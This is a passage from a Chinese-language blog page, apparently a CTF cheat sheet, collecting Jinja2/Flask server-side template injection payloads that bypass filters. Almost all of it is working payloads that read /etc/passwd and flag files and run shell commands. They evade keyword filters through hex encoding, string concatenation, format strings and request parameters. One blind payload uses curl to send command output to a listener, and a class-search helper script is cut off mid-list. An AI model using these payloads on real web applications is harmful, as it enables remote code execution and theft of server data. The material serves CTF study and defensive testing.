jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f&#x3D;%s%sclass%s%s&amp;a&#x3D;_</code></pre></div><h2 id="过滤了引号-‘’（利用request）"><a href="#过滤了引号-‘’（利用request）" class="headerlink" title="过滤了引号 ‘’（利用request）"></a>过滤了引号 ‘’<strong>（利用request）</strong></h2><p>flask 中</p><p>request.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。</p><div class="hljs code-wrapper"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd</code></pre></div><h2 id="过滤了花括号-123-125-盲注"><a href="#过滤了花括号-123-125-盲注" class="headerlink" title="过滤了花括号{&#123; &#125;}(盲注)"></a>过滤了花括号{&#123; &#125;}(盲注)</h2><div class="hljs code-wrapper"><pre><code class="hljs jinja2">#用&#123;%%&#125;标记&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;127.0.0.1:7999&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</code></pre></div><h2 id="过滤-globals"><a href="#过滤-globals" class="headerlink" title="过滤__globals__"></a>过滤<code>__globals__</code></h2><p>当<code>__globals__</code>被禁用时，</p><ul><li>可以用func_globals直接替换；</li><li>使用<code>__getattribute__(‘__globa’+’ls__‘)</code>；</li></ul><p>如：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 原型是调用__globals__</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-comment"># 如果过滤了__globals__，可直接替换为func_globals</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-comment"># 也可以通过拼接字符串得到方式绕过</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__getattribute__(<span class="hljs-string">&quot;__glo&quot;</span>+<span class="hljs-string">&quot;bals__&quot;</span>)[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div><h2 id="过滤-mro-或-bases-或-base"><a href="#过滤-mro-或-bases-或-base" class="headerlink" title="过滤__mro__或__bases__或__base__"></a>过滤<code>__mro__或__bases__或__base__</code></h2><p>两者可互相替换来Bypass其中之一被禁用的情况，但需要注意两者获取object类时的格式区别：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>][].__class__.__mro__[<span class="hljs-number">1</span>]&#123;&#125;.__class__.__mro__[<span class="hljs-number">1</span>]().__class__.__mro__[<span class="hljs-number">1</span>][].__class__.__mro__[-<span class="hljs-number">1</span>]&#123;&#125;.__class__.__mro__[-<span class="hljs-number">1</span>]().__class__.__mro__[-<span class="hljs-number">1</span>]&#123;&#125;.__class__.__bases__[<span class="hljs-number">0</span>]().__class__.__bases__[<span class="hljs-number">0</span>][].__class__.__bases__[<span class="hljs-number">0</span>][].__class__.__base__().__class__.__base__&#123;&#125;.__class__.__base__</code></pre></div><p>如：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 三者互换均可</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)().__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div><h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><p>凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。</p><p>如：</p><div class="hljs code-wrapper"><pre><code class="hljs sqf"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__bu&#x27;</span>+<span class="hljs-string">&#x27;iltins__&#x27;</span>][<span class="hljs-string">&#x27;__impor&#x27;</span>+<span class="hljs-string">&#x27;t__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).system(<span class="hljs-string">&#x27;ca&#x27;</span>+<span class="hljs-string">&#x27;lc&#x27;</span>)</code></pre></div><h2 id="hex编码（重要）"><a href="#hex编码（重要）" class="headerlink" title="hex编码（重要）"></a><strong>hex编码（重要）</strong></h2><p>hex编码可以绕过大部分过滤</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5f&#39;][&#39;\x5f\x5fbuiltins\x5f\x5f&#39;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;id&#39;)[&#39;read&#39;]()&#125;&#125;</code></pre></div><p>例如：</p><div class="hljs code-wrapper"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</code></pre></div><p>Into:</p><div class="hljs code-wrapper"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64&#x27;</span>).read()&#125;&#125;</code></pre></div><p><strong>另一个更加高级的例子</strong></p><div class="hljs code-wrapper"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ().__class__.__base__.__subclasses__() %&#125;    &#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span> <span class="hljs-keyword">in</span> x.__name__ %&#125;        &#123;&#123;x()._module.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;ls&quot;</span>).read()&#125;&#125;    &#123;%endif%&#125;&#123;%endfor%&#125;</code></pre></div><p>Can be converted to:</p><p><strong>注：</strong>将<code>.__class__</code>用<code>[&#39;__class__&#39;]</code>的方式是jinja2中支持的语法，在python 命令行中无法这样使用。</p><div class="hljs code-wrapper"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> [][<span class="hljs-string">&quot;__class__&quot;</span>[<span class="hljs-string">&quot;decode&quot;</span>](<span class="hljs-string">&quot;hex&quot;</span>)][<span class="hljs-string">&quot;__base__&quot;</span>[<span class="hljs-string">&quot;decode&quot;</span>](<span class="hljs-string">&quot;hex&quot;</span>)][<span class="hljs-string">&quot;__subclasses__&quot;</span>[<span class="hljs-string">&quot;decode&quot;</span>](<span class="hljs-string">&quot;hex&quot;</span>)]() %&#125;    &#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span>[<span class="hljs-string">&quot;decode&quot;</span>](<span class="hljs-string">&quot;hex&quot;</span>) <span class="hljs-keyword">in</span> a[<span class="hljs-string">&quot;__name__&quot;</span>[<span class="hljs-string">&quot;decode&quot;</span>](<span class="hljs-string">&quot;hex&quot;</span>)] %&#125;        &#123;&#123;a()[<span class="hljs-string">&quot;5F6D6F64756C65&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)][<span class="hljs-string">&quot;5F5F6275696C74696E735F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)][<span class="hljs-string">&quot;5F5F696D706F72745F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)](<span class="hljs-string">&quot;6F73&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>))[<span class="hljs-string">&quot;706F70656E&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)](<span class="hljs-string">&quot;6563686F2024666C6167&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>))[<span class="hljs-string">&quot;72656164&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)]()&#125;&#125;    &#123;%endif%&#125;&#123;%endfor%&#125;</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> [][<span class="hljs-string">&quot;5F5F636C6173735F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)][<span class="hljs-string">&quot;5F5F626173655F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)][<span class="hljs-string">&quot;5F5F737562636C61737365735F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)]() %&#125;    &#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;7761726E696E67&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>) <span class="hljs-keyword">in</span> a[<span class="hljs-string">&quot;5F5F6E616D655F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)] %&#125;        &#123;&#123;a()[<span class="hljs-string">&quot;5F6D6F64756C65&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)][<span class="hljs-string">&quot;5F5F6275696C74696E735F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)][<span class="hljs-string">&quot;5F5F696D706F72745F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)](<span class="hljs-string">&quot;6F73&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>))[<span class="hljs-string">&quot;706F70656E&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)](<span class="hljs-string">&quot;6c73&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>))[<span class="hljs-string">&quot;72656164&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)]()&#125;&#125;    &#123;%endif%&#125;&#123;%endfor%&#125;</code></pre></div><h2 id="Unicode-类似hex"><a href="#Unicode-类似hex" class="headerlink" title="Unicode 类似hex"></a>Unicode 类似hex</h2><h2 id="格式化字符串方法"><a href="#格式化字符串方法" class="headerlink" title="格式化字符串方法"></a>格式化字符串方法</h2><div class="hljs code-wrapper"><pre><code class="hljs jinja2">?&#123;% print(session|attr(&quot;__init__&quot;))|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;open(\&quot;&#x2F;flag.txt\&quot;).read()&quot;)%&#125;​# 将&quot;&quot;内的字符串换成格式化字符串的形式​http:&#x2F;&#x2F;124.70.199.12:30195&#x2F;success?msg&#x3D;&#123;%print(session|attr(&quot;%c&quot;%(95)%2b&quot;%c&quot;%(95)%2b&quot;%c&quot;%(105)%2b&quot;%c&quot;%(110)%2b&quot;%c&quot;%(105)%2b&quot;%c&quot;%(116)%2b&quot;%c&quot;%(95)%2b&quot;%c&quot;%(95))|attr(&quot;%c&quot;%(95)%2b&quot;%c&quot;%(95)%2b&quot;%c&quot;%(103)%2b&quot;%c&quot;%(108)%2b&quot;%c&quot;%(111)%2b&quot;%c&quot;%(98)%2b&quot;%c&quot;%(97)%2b&quot;%c&quot;%(108)%2b&quot;%c&quot;%(115)%2b&quot;%c&quot;%(95)%2b&quot;%c&quot;%(95))|attr(&quot;%c&quot;%(103)%2b&quot;%c&quot;%(101)%2b&quot;%c&quot;%(116))(&quot;%c&quot;%(95)%2b&quot;%c&quot;%(95)%2b&quot;%c&quot;%(98)%2b&quot;%c&quot;%(117)%2b&quot;%c&quot;%(105)%2b&quot;%c&quot;%(108)%2b&quot;%c&quot;%(116)%2b&quot;%c&quot;%(105)%2b&quot;%c&quot;%(110)%2b&quot;%c&quot;%(115)%2b&quot;%c&quot;%(95)%2b&quot;%c&quot;%(95))|attr(&quot;%c&quot;%(103)%2b&quot;%c&quot;%(101)%2b&quot;%c&quot;%(116))(&quot;%c&quot;%(101)%2b&quot;%c&quot;%(118)%2b&quot;%c&quot;%(97)%2b&quot;%c&quot;%(108))(&quot;%c&quot;%(111)%2b&quot;%c&quot;%(112)%2b&quot;%c&quot;%(101)%2b&quot;%c&quot;%(110)%2b&quot;%c&quot;%(40)%2b&quot;%c&quot;%(39)%2b&quot;%c&quot;%(102)%2b&quot;%c&quot;%(108)%2b&quot;%c&quot;%(97)%2b&quot;%c&quot;%(103)%2b&quot;%c&quot;%(46)%2b&quot;%c&quot;%(116)%2b&quot;%c&quot;%(120)%2b&quot;%c&quot;%(116)%2b&quot;%c&quot;%(39)%2b&quot;%c&quot;%(41)%2b&quot;%c&quot;%(46)%2b&quot;%c&quot;%(114)%2b&quot;%c&quot;%(101)%2b&quot;%c&quot;%(97)%2b&quot;%c&quot;%(100)%2b&quot;%c&quot;%(40)%2b&quot;%c&quot;%(41)))%&#125;</code></pre></div><h2 id="过滤-‘-“-args"><a href="#过滤-‘-“-args" class="headerlink" title="过滤 ‘    “    _    .    [    ]    args"></a>过滤 ‘    “    _    .    [    ]    args</h2><p>过滤了”,所以hex编码不能用了</p><p>过滤了args，所以request.args不能用了，可以用request.values绕过，POST和GET两种方法传递的数据它都可以接收。</p><p>示例payload</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()|attr(request.values.x4)(77)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4)(request.values.x7)|attr(request.values.x4)(request.values.x8)(request.values.x9)&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;cat flag.txt&#39;).read()</code></pre></div><p>在大多数示例中，我们用来<code>request.args</code>访问GET参数，但是可以使用自定义值填充其他字典：</p><ul><li>GET： <code>request.args</code></li><li>Cookie： <code>request.cookies</code></li><li>headers： <code>request.headers</code></li><li>environ： <code>request.environ</code></li><li>POST： <code>request.values</code></li></ul><h2 id="过滤了-‘-123-request-args-values-g"><a href="#过滤了-‘-123-request-args-values-g" class="headerlink" title="过滤了 ‘    _    .    [    {&#123;    request    args    values    g"></a>过滤了 ‘    _    .    [    {&#123;    request    args    values    g</h2><ul><li>没有过滤”，可以进行hex编码</li><li>过滤了request，我们可以使用 <code>（）</code>配合attr</li><li>过滤了{&#123; &#125;}，使用<code>&#123;%%&#125;`代替示例payload：<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;%print(()|attr(&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;)()|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(258)|attr(&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)())%&#125;&#123;%print(()|attr(&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;)()|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(258)|attr(&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74&quot;)|attr(&quot;read&quot;)())%&#125;</code></pre></div># **利用脚本**## 0x01 搜索可用类找到不含wrapper的类然后列举出其中含有`os或者sys或者__builtins__`的全局变量<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> chain <span class="hljs-keyword">import</span> search_for_os_sys_builins,print_resultunbound_class = []os_list = []sys_list = []builtins_list = []results = search_for_os_sys_builins()<span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results:    <span class="hljs-keyword">if</span> results[result][<span class="hljs-string">&#x27;flag&#x27;</span>]:        <span class="hljs-comment"># print(&#x27;[+]&#x27; + result)</span>        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results[result][<span class="hljs-string">&#x27;result&#x27;</span>]:            <span class="hljs-keyword">if</span> results[result][<span class="hljs-string">&#x27;result&#x27;</span>][r] == <span class="hljs-string">&#x27;yes&#x27;</span> :                <span class="hljs-keyword">if</span> r == <span class="hljs-string">&#x27;os&#x27;</span>:                    os_list.append(result)                <span class="hljs-keyword">if</span> r == <span class="hljs-string">&#x27;sys&#x27;</span>:                    sys_list.append(result)                <span class="hljs-keyword">if</span> r == <span class="hljs-string">&#x27;__builtins__&#x27;</span>:                    builtins_list.append(result)print(os_list)print(sys_list)print(builtins_list)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()):    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrapper&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(i[<span class="hljs-number">1</span>].__init__):        unbound_class.append(i[<span class="hljs-number">1</span>].__init__)        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> os_list:            <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> i[<span class="hljs-number">1</span>].__init__.__globals__.keys():                <span class="hljs-comment"># print(i)</span>                print(i[<span class="hljs-number">0</span>],i[<span class="hljs-number">1</span>].__init__,x)        <span class="hljs-comment"># for x in sys_list:</span>        <span class="hljs-comment">#     if x in i[1].__init__.__globals__.keys():</span>        <span class="hljs-comment">#         # print(i)</span>        <span class="hljs-comment">#         print(i[0], i[1].__init__)</span>        <span class="hljs-comment">#</span>        <span class="hljs-comment"># print(&quot;[+] __builtins__:&quot;)</span>        <span class="hljs-comment"># for x in os_list:</span>        <span class="hljs-comment">#     if x in i[1].__init__.__globals__.keys():</span>        <span class="hljs-comment">#         # print(i)</span>        <span class="hljs-comment">#         print(i[0], i[1].__init__)</span></code></pre></div>chain.py<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding:utf8 -*-</span><span class="hljs-comment"># By Macr0phag3</span><span class="hljs-comment"># in 2019-05-07 19:46:12</span><span class="hljs-comment"># ------------------------------------</span><span class="hljs-comment"># this, antigravity 库删掉</span>all_modules_2 = [    <span class="hljs-string">&#x27;BaseHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;imaplib&#x27;</span>, <span class="hljs-string">&#x27;shelve&#x27;</span>, <span class="hljs-string">&#x27;Bastion&#x27;</span>, <span class="hljs-string">&#x27;anydbm&#x27;</span>, <span class="hljs-string">&#x27;imghdr&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;CDROM&#x27;</span>, <span class="hljs-string">&#x27;argparse&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;Canvas&#x27;</span>, <span class="hljs-string">&#x27;ast&#x27;</span>, <span class="hljs-string">&#x27;imputil&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;ConfigParser&#x27;</span>, <span class="hljs-string">&#x27;asynchat&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;sitecustomize&#x27;</span>, <span class="hljs-string">&#x27;Cookie&#x27;</span>, <span class="hljs-string">&#x27;asyncore&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;DLFCN&#x27;</span>, <span class="hljs-string">&#x27;atexit&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;smtplib&#x27;</span>, <span class="hljs-string">&#x27;Dialog&#x27;</span>, <span class="hljs-string">&#x27;audiodev&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-string">&#x27;sndhdr&#x27;</span>, <span class="hljs-string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;audioop&#x27;</span>, <span class="hljs-string">&#x27;keyword&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;FileDialog&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;lib2to3&#x27;</span>, <span class="hljs-string">&#x27;spwd&#x27;</span>, <span class="hljs-string">&#x27;FixTk&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;sqlite3&#x27;</span>, <span class="hljs-string">&#x27;HTMLParser&#x27;</span>, <span class="hljs-string">&#x27;binascii&#x27;</span>, <span class="hljs-string">&#x27;linuxaudiodev&#x27;</span>, <span class="hljs-string">&#x27;sre&#x27;</span>, <span class="hljs-string">&#x27;IN&#x27;</span>, <span class="hljs-string">&#x27;binhex&#x27;</span>, <span class="hljs-string">&#x27;locale&#x27;</span>, <span class="hljs-string">&#x27;sre_compile&#x27;</span>, <span class="hljs-string">&#x27;MimeWriter&#x27;</span>, <span class="hljs-string">&#x27;bisect&#x27;</span>, <span class="hljs-string">&#x27;logging&#x27;</span>, <span class="hljs-string">&#x27;sre_constants&#x27;</span>, <span class="hljs-string">&#x27;Queue&#x27;</span>, <span class="hljs-string">&#x27;bsddb&#x27;</span>, <span class="hljs-string">&#x27;lsb_release&#x27;</span>, <span class="hljs-string">&#x27;sre_parse&#x27;</span>, <span class="hljs-string">&#x27;ScrolledText&#x27;</span>, <span class="hljs-string">&#x27;bz2&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;ssl&#x27;</span>, <span class="hljs-string">&#x27;SimpleDialog&#x27;</span>, <span class="hljs-string">&#x27;cPickle&#x27;</span>, <span class="hljs-string">&#x27;macurl2path&#x27;</span>, <span class="hljs-string">&#x27;stat&#x27;</span>, <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;cProfile&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;statvfs&#x27;</span>, <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;cStringIO&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;SocketServer&#x27;</span>, <span class="hljs-string">&#x27;calendar&#x27;</span>, <span class="hljs-string">&#x27;markupbase&#x27;</span>, <span class="hljs-string">&#x27;stringold&#x27;</span>, <span class="hljs-string">&#x27;StringIO&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>, <span class="hljs-string">&#x27;marshal&#x27;</span>, <span class="hljs-string">&#x27;stringprep&#x27;</span>, <span class="hljs-string">&#x27;TYPES&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;math&#x27;</span>, <span class="hljs-string">&#x27;strop&#x27;</span>, <span class="hljs-string">&#x27;Tix&#x27;</span>, <span class="hljs-string">&#x27;chunk&#x27;</span>, <span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-string">&#x27;struct&#x27;</span>, <span class="hljs-string">&#x27;Tkconstants&#x27;</span>, <span class="hljs-string">&#x27;cmath&#x27;</span>, <span class="hljs-string">&#x27;mhlib&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;Tkdnd&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;mimetools&#x27;</span>, <span class="hljs-string">&#x27;sunau&#x27;</span>, <span class="hljs-string">&#x27;Tkinter&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;sunaudio&#x27;</span>, <span class="hljs-string">&#x27;UserDict&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;mimify&#x27;</span>, <span class="hljs-string">&#x27;symbol&#x27;</span>, <span class="hljs-string">&#x27;UserList&#x27;</span>, <span class="hljs-string">&#x27;codeop&#x27;</span>, <span class="hljs-string">&#x27;mmap&#x27;</span>, <span class="hljs-string">&#x27;symtable&#x27;</span>, <span class="hljs-string">&#x27;UserString&#x27;</span>, <span class="hljs-string">&#x27;collections&#x27;</span>, <span 